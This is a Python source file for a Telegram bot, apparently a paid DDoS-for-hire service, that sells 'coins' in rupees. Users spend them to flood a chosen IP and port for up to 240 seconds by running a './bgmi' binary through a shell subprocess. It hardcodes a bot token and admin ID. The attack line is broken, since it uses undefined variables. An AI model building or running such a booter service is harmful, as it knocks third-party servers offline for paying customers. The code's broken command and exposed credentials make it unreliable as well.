import os
import time
import telebot
import datetime
import subprocess
import threading
import json
from telebot import types

# Insert your Telegram bot token here
bot = telebot.TeleBot('7804973923:AAFIzezyBbm79a9PUsO7BFQQrYPLf1DGsAA')

# Admin user IDs
admin_id = {"7210717311"}

# Files for data storage
LOG_FILE = "log.txt"
DATA_FILE = "data.json"  # Path to the JSON file where user data is stored

# Attack setting for users
COOLDOWN_PERIOD = 300
ATTACK_COST = 5

# In-memory storage
users = {}
last_attack_time = {}
user_coins = {}  # Store user coins here

# Load data from data.json if it exists
def load_data():
    global user_coins
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as file:
            data = json.load(file)
            user_coins = data.get("coins", {})

# Save data to data.json
def save_data():
    data = {
        "coins": user_coins
    }
    with open(DATA_FILE, "w") as file:
        json.dump(data, file, indent=4)

# Log command function
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"{user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
        
attack_in_process = False

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    global attack_in_process  # Access the global variable

    user_id = str(message.chat.id)

    # Check if the user has enough coins for the attack
    if user_id not in user_coins or user_coins[user_id] < ATTACK_COST:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! ⛔️\n\nOops! It seems like you don't have enough coins to use the Attack command. To gain coins and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for coins.\n🌟 Become a proud supporter and purchase coins.\n💬 Chat with an admin now and level up your experience!\n\nPer attack you need only 5 coins!"
        bot.reply_to(message, response)
        return
        
    if attack_in_process:
        bot.reply_to(message, "⛔️ 𝗔𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀.\n𝗨𝘀𝗲 /check 𝘁𝗼 𝘀𝗲𝗲 𝗿𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲!")
        return

    # Check if cooldown period has passed
    if user_id in last_attack_time:
        time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
            response = f" ⛔ 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗮𝘁𝘁𝗮𝗰𝗸𝗶𝗻𝗴 𝗮𝗴𝗮𝗶𝗻 "
            bot.reply_to(message, response)
            return  # Prevent the attack from proceeding

    # Prompt the user for attack details
    response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
    bot.reply_to(message, response)
    bot.register_next_step_handler(message, process_attack_details)

# Global variable to track attack status and start time
attack_in_process = False
attack_start_time = None
attack_duration = 0  # Attack duration in seconds

# Function to handle the attack command
@bot.message_handler(commands=['check'])
def show_remaining_attack_time(message):
    if attack_in_process:
        # Calculate the elapsed time
        elapsed_time = (datetime.datetime.now() - attack_start_time).total_seconds()
        remaining_time = max(0, attack_duration - elapsed_time)  # Ensure remaining time doesn't go negative

        if remaining_time > 0:
            response = f"🚨 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀! 🚨\n\n𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲: {int(remaining_time)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀."
        else:
            response = "✅ 𝗧𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗵𝗮𝘀 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!"
    else:
        response = "✅ 𝗡𝗼 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀"

    bot.reply_to(message, response)

def run_attack(command):
    subprocess.Popen(command, shell=True)

def process_attack_details(message):
    global attack_in_process, attack_start_time, attack_duration

    user_id = str(message.chat.id)

    details = message.text.split()
    remaining_coins = user_coins.get(user_id, 0) - ATTACK_COST

    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            time = int(details[2])
            if time > 240:
                response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗮𝗻 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            else:
                # Deduct coins and log attack
                user_coins[user_id] -= ATTACK_COST
                save_data()
                log_command(user_id, target, port, time)
                
                full_command = f"./bgmi {name} {sername} {test_time} {duration} 100"
                username = message.chat.username or "No username"

                # Set attack_in_process to True before sending the response
                attack_in_process = True
                attack_start_time = datetime.datetime.now()
                attack_duration = time  

                # Prevent duplicate responses by sending only once
                response = (f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n"
                            f"𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n"
                            f"𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
                            f"𝗗𝗲𝗱𝘂𝗰𝘁𝗲𝗱 𝗰𝗼𝗶𝗻𝘀: 5 𝗰𝗼𝗶𝗻𝘀\n"
                            f"𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗰𝗼𝗶𝗻𝘀: {remaining_coins} 𝗰𝗼𝗶𝗻𝘀\n"
                            f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}")

                bot.reply_to(message, response)

                # Run attack in a separate thread
                attack_thread = threading.Thread(target=run_attack, args=(full_command,))
                attack_thread.start()

                # Reset attack_in_process after the attack ends
                threading.Timer(time, reset_attack_status).start()

        except ValueError:
            response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁."
            bot.reply_to(message, response)
    else:
        response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁"
        bot.reply_to(message, response)

def reset_attack_status():
    global attack_in_process
    attack_in_process = False

def send_attack_finished_message(chat_id, target, port, time):
    global attack_in_process  # Access the global variable

    """Notify the user that the attack is finished."""
    message = f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱! ✅"
    bot.send_message(chat_id, message)
    
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found"
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response)
    
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    role = "Admin" if user_id in admin_id else "User"
    status = "Active ✅" if user_id in user_coins else "Inactive ❌"

    # Format the response
    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"🔖 𝗥𝗼𝗹𝗲: {role}\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"📊 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
        f"💰 𝗖𝗼𝗶𝗻𝘀: {user_coins.get(user_id, 0)}"
    )

    bot.reply_to(message, response)
	
@bot.message_handler(commands=['users'])
def show_users(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        if user_coins:  # Check if there are users
            users_info = "\n".join([f"🆔 {uid}: {coins} coins" for uid, coins in user_coins.items()])
            response = f"𝗨𝘀𝗲𝗿𝘀 𝗮𝗻𝗱 𝗖𝗼𝗶𝗻𝘀:\n\n{users_info}"
        else:
            response = "No users found."
        bot.reply_to(message, response)
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response)
        
# Admin adds coins to a user's account
@bot.message_handler(commands=['add'])
def add_coins(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            target_user_id, coins = message.text.split()[1], int(message.text.split()[2])
            if target_user_id not in user_coins:
                user_coins[target_user_id] = 0
            user_coins[target_user_id] += coins
            save_data()  # Save updated data to JSON

            # Send message to admin
            response = f"✅ {coins} 𝗰𝗼𝗶𝗻𝘀 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 {target_user_id}'𝘀 𝗮𝗰𝗰𝗼𝘂𝗻𝘁!"
            
        except (IndexError, ValueError):
            response = "❗️𝗨𝘀𝗮𝗴𝗲: /add <user_id> <coins>"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
    
    bot.reply_to(message, response)

# Admin deducts coins from a user's account
@bot.message_handler(commands=['deduct'])
def deduct_coins(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            target_user_id, coins = message.text.split()[1], int(message.text.split()[2])
            if target_user_id not in user_coins:
                response = f"❗️User {target_user_id} doesn't have any coins yet."
            else:
                # Deduct the coins
                user_coins[target_user_id] = max(0, user_coins[target_user_id] - coins)
                save_data()  # Save updated data to JSON
                
                # Send message to admin
                response = f"✅ {coins} 𝗰𝗼𝗶𝗻𝘀 𝗱𝗲𝗱𝘂𝗰𝘁𝗲𝗱 𝗳𝗿𝗼𝗺 {target_user_id}'𝘀 𝗮𝗰𝗰𝗼𝘂𝗻𝘁!"

        except (IndexError, ValueError):
            response = "❗️𝗨𝘀𝗮𝗴𝗲: /deduct <user_id> <coins>"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
    
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    buycoin_button = types.KeyboardButton("💰 Buy Coins")
    markup.add(attack_button, myinfo_button, buycoin_button)
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗺𝗲𝗴𝗼𝘅𝗲𝗿 𝗯𝗼𝘁!", reply_markup=markup)
    
@bot.message_handler(func=lambda message: message.text == "💰 Buy Coins")
def buy_coins(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("50 COINS - 75/-", callback_data="buy_50")
    button2 = types.InlineKeyboardButton("100 COINS - 150/-", callback_data="buy_100")
    button3 = types.InlineKeyboardButton("200 COINS - 300/-", callback_data="buy_200")
    markup.add(button1, button2, button3)
    
    bot.reply_to(message, "✅ 𝗖𝗵𝗼𝗼𝘀𝗲 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝗻:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
def handle_buy_callback(call):
    admin_username = "@DARKVIPDDOSX"  # Replace with your admin username
    coin_plans = {
        "buy_50": "50 coins \n💰 𝗣𝗿𝗶𝗰𝗲: 75 Rs",
        "buy_100": "100 coins \n💰 𝗣𝗿𝗶𝗰𝗲: 150 Rs",
        "buy_200": "200 coins \n💰 𝗣𝗿𝗶𝗰𝗲: 300 Rs"
    }

    if call.data in coin_plans:
        chosen_plan = coin_plans[call.data]
        bot.send_message(call.message.chat.id, f"📩 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗯𝘂𝘆 𝗰𝗼𝗶𝗻𝘀:\n\n👤 𝗔𝗱𝗺𝗶𝗻: {admin_username}\n💳 𝗣𝗹𝗮𝗻: {chosen_plan}")
        bot.delete_message(call.message.chat.id, call.message.message_id)  # Delete the plan selection message
        
@bot.message_handler(commands=['send'])
def send_coins(message):
    sender_id = str(message.chat.id)
    
    try:
        _, recipient_id, amount = message.text.split()
        amount = int(amount)

        # Determine transaction fee
        if 1 <= amount <= 50:
            fee = 5
        elif 51 <= amount <= 100:
            fee = 10
        elif amount >= 101:
            fee = 20
        else:
            bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗮𝗺𝗼𝘂𝗻𝘁. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝗮𝘁 𝗹𝗲𝗮𝘀𝘁 1 𝗰𝗼𝗶𝗻❗️")
            return

        total_cost = amount + fee

        # Check if sender has enough coins (including fee)
        if sender_id not in user_coins or user_coins[sender_id] < total_cost:
            bot.reply_to(message, f"❕𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝗮𝘁 𝗹𝗲𝗮𝘀𝘁 {total_cost} 𝗰𝗼𝗶𝗻𝘀 𝘁𝗼 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲 𝘁𝗵𝗶𝘀 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 (including a {fee} coin fee).")
            return

        # Deduct coins (amount + fee) from sender
        user_coins[sender_id] -= total_cost

        # Add coins to recipient
        if recipient_id not in user_coins:
            user_coins[recipient_id] = 0
        user_coins[recipient_id] += amount

        # Save updated data
        save_data()

        # Notify sender
        bot.reply_to(message, f"✅ 𝗧𝗿𝗮𝗻𝘀𝗳𝗲𝗿 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹!\n\n"
                              f"📤 𝗦𝗲𝗻𝘁: {amount} 𝗰𝗼𝗶𝗻𝘀\n"
                              f"📩 𝗙𝗲𝗲: {fee} 𝗰𝗼𝗶𝗻𝘀\n"
                              f"💰 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {user_coins[sender_id]} 𝗰𝗼𝗶𝗻𝘀\n"
                              f"🆔 𝗥𝗲𝗰𝗶𝗽𝗶𝗲𝗻𝘁: {recipient_id}")
        
    except (IndexError, ValueError):
        bot.reply_to(message, "❗️𝗨𝘀𝗮𝗴𝗲: /send <user_id> <coins>")
        
@bot.message_handler(commands=['remove'])
def clear_user(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        try:
            target_user_id = message.text.split()[1]
            
            if target_user_id in user_coins:
                del user_coins[target_user_id]
                save_data()  # Save updated data to JSON
                response = f"✅ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗳𝗿𝗼𝗺 𝘁𝗵𝗲 𝗱𝗮𝘁𝗮"
            else:
                response = f"❗ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺."
        except IndexError:
            response = "❗ Usage: /remove <user_id>"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
    
    bot.reply_to(message, response)

if __name__ == "__main__":
    load_data()  # Load user data on bot startup
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            # Add a small delay to avoid rapid looping in case of persistent errors
            time.sleep(3)